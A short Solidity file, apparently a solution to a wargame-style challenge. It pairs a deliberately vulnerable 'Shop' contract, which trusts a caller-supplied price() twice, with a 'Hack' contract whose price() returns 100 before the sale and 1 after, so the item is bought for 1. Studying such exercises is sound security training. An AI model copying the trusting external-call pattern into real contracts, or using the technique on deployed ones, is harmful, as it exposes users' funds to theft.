// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract Hack{
    Shop target;
    constructor (Shop _target){
        target = _target;
        
    }

    function pwn() external {
        target.buy();
    }

    

    function price() external view returns (uint){
        // 1st call 100
        if(target.isSold()){
            return 1;
        }else{
            return 100;
        }
    }
}